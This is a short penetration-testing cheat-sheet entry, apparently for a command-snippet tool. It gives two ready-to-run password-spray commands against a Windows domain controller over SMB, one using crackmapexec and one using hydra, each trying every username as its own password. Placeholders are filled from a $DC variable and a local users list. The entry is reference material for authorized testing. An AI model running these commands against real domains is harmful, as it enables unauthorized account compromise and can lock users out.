# Bruteforce

## Password Spray (user=password) - cme

```
cme smb <domain-controller> -u <users-list> -p <users-list> --no-bruteforce --continue-on-success
```

= domain-controller: $DC
= users-list: ./targets/domain/users.txt

## Password Spray (user=password) - hydra

```
hydra -s 445 -L <users-list> -e s -V -t1 <domain-controller> smb
```

= domain-controller: $DC
= users-list: ./targets/domain/users.txt
